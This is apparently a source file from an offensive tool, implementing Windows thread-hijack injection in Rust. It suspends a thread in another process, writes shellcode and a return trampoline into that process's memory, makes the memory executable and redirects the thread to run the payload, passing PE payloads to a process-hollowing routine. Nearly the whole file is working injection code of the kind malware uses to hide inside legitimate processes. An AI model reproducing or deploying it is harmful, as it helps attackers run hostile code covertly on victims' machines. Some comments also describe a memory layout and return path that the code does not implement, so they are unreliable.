use anyhow::{anyhow, Result};
use crate::injection::Injector;

pub struct ThreadHijackInjector;

#[cfg(windows)]
impl Injector for ThreadHijackInjector {
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        use winapi::um::processthreadsapi::{OpenProcess, OpenThread, SuspendThread, GetThreadContext, SetThreadContext, ResumeThread, FlushInstructionCache};
        use winapi::um::winnt::{PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_CREATE_THREAD, THREAD_SUSPEND_RESUME, THREAD_GET_CONTEXT, THREAD_SET_CONTEXT};
        use winapi::um::winnt::{CONTEXT, CONTEXT_FULL};
        use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32};
        use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
        use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
        use winapi::shared::minwindef::FALSE;

        let is_pe = payload.len() >= 2 && payload[0] == b'M' && payload[1] == b'Z';
        if is_pe {
            log::info!("PE payload detected, forwarding to process hollowing's inject_into_process");
            return match hollowing::windows_impl::inject_into_process(pid, payload) {
                Ok(_) => Ok(()),
                Err(e) => Err(anyhow!("process hollowing PE injection failed: {}", e))
            };
        }

        unsafe {
            let h_proc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, 0, pid);
            if h_proc.is_null() { return Err(anyhow!("Failed to open process with correct permissions")); }

            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            if snapshot == INVALID_HANDLE_VALUE {
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to create toolhelp snapshot"));
            }

            let mut te32: THREADENTRY32 = std::mem::zeroed();
            te32.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;

            let mut target_tid = 0;
            if Thread32First(snapshot, &mut te32) != FALSE {
                loop {
                    if te32.th32OwnerProcessID == pid {
                        target_tid = te32.th32ThreadID;
                        break;
                    }
                    if Thread32Next(snapshot, &mut te32) == FALSE { break; }
                }
            }
            CloseHandle(snapshot);

            if target_tid == 0 {
                CloseHandle(h_proc);
                return Err(anyhow!("No threads found in target process"));
            }

            let h_thread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, 0, target_tid);
            if h_thread.is_null() {
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to open thread with required permissions"));
            }

            if SuspendThread(h_thread) == u32::MAX {
                CloseHandle(h_thread);
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to suspend thread"));
            }

            let cleanup = |msg: &str| -> Result<()> {
                unsafe {
                    ResumeThread(h_thread);
                    CloseHandle(h_thread);
                    CloseHandle(h_proc);
                }
                Err(anyhow!("{}", msg))
            };

            let mut ctx: CONTEXT = std::mem::zeroed();
            ctx.ContextFlags = CONTEXT_FULL;

            if GetThreadContext(h_thread, &mut ctx) == FALSE {
                return cleanup("Failed to get thread context");
            }

            // ── Context-restore trampoline ──────────────────────────────────────
            //
            // Layout of the remote allocation (x86_64):
            //
            //   [0..payload.len()]         : shellcode
            //   [payload.len()..+8]        : saved original RIP (8 bytes)
            //   [payload.len()+8..+stub]   : restore trampoline
            //
            // The trampoline is a minimal x86_64 stub that pops our scratch
            // register, then returns execution to the original RIP via a JMP
            // to the address stored immediately before it.
            //
            //   push  <original_rip>         ; 68 <lo4> + C7 44 24 04 <hi4>
            //   ret                          ; C3
            //
            // This means: when the shellcode does its final RET, it lands at
            // trampoline_addr.  The trampoline re-pushes original_rip and rets
            // into it, restoring normal execution without leaving anything on
            // the stack that would confuse the target's unwinder.

            #[cfg(target_arch = "x86_64")]
            let original_rip = ctx.Rip;
            #[cfg(target_arch = "x86")]
            let original_rip = ctx.Eip as u64;

            // Build the restore trampoline bytes.
            // push imm64 is not a single x86 instruction; use two-part PUSH+patch:
            //   push low_dword   : 68 XX XX XX XX
            //   mov [rsp+4], dword high_dword  : C7 44 24 04 XX XX XX XX
            //   ret              : C3
            let lo = (original_rip & 0xFFFF_FFFF) as u32;
            let hi = ((original_rip >> 32) & 0xFFFF_FFFF) as u32;
            let mut trampoline: Vec<u8> = Vec::with_capacity(14);
            trampoline.push(0x68);                      // PUSH imm32
            trampoline.extend_from_slice(&lo.to_le_bytes());
            trampoline.extend_from_slice(&[0xC7, 0x44, 0x24, 0x04]); // MOV [rsp+4], imm32
            trampoline.extend_from_slice(&hi.to_le_bytes());
            trampoline.push(0xC3);                      // RET

            let alloc_size = payload.len() + trampoline.len();
            // Allocate RW, write shellcode + trampoline, then flip to RX
            let remote_mem = VirtualAllocEx(h_proc, std::ptr::null_mut(), alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if remote_mem.is_null() {
                return cleanup("Failed to allocate remote memory");
            }

            let trampoline_addr = (remote_mem as usize + payload.len()) as *mut std::os::raw::c_void;

            // Write shellcode
            let mut written = 0usize;
            if WriteProcessMemory(h_proc, remote_mem, payload.as_ptr() as _, payload.len(), &mut written) == FALSE {
                return cleanup("Failed to write shellcode to remote memory");
            }
            // Write restore trampoline
            if WriteProcessMemory(h_proc, trampoline_addr, trampoline.as_ptr() as _, trampoline.len(), &mut written) == FALSE {
                return cleanup("Failed to write restore trampoline to remote memory");
            }

            // Flip to execute-read before redirecting RIP
            let mut old_prot = 0u32;
            VirtualProtectEx(h_proc, remote_mem, alloc_size, PAGE_EXECUTE_READ, &mut old_prot);

            if FlushInstructionCache(h_proc, remote_mem, alloc_size) == FALSE {
                return cleanup("Failed to flush instruction cache");
            }

            // Redirect RIP/EIP to shellcode; when shellcode rets it will land
            // at trampoline which restores original_rip.
            #[cfg(target_arch = "x86_64")]
            { ctx.Rip = remote_mem as u64; }
            #[cfg(target_arch = "x86")]
            { ctx.Eip = remote_mem as u32; }

            if SetThreadContext(h_thread, &ctx) == FALSE {
                return cleanup("Failed to set modified thread context");
            }

            if ResumeThread(h_thread) == u32::MAX {
                CloseHandle(h_thread);
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to resume thread after setting context"));
            }

            CloseHandle(h_thread);
            CloseHandle(h_proc);
        }
        Ok(())
    }
}

#[cfg(not(windows))]
impl Injector for ThreadHijackInjector {
    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
        Err(anyhow!("Thread Hijacking only supported on Windows"))
    }
}
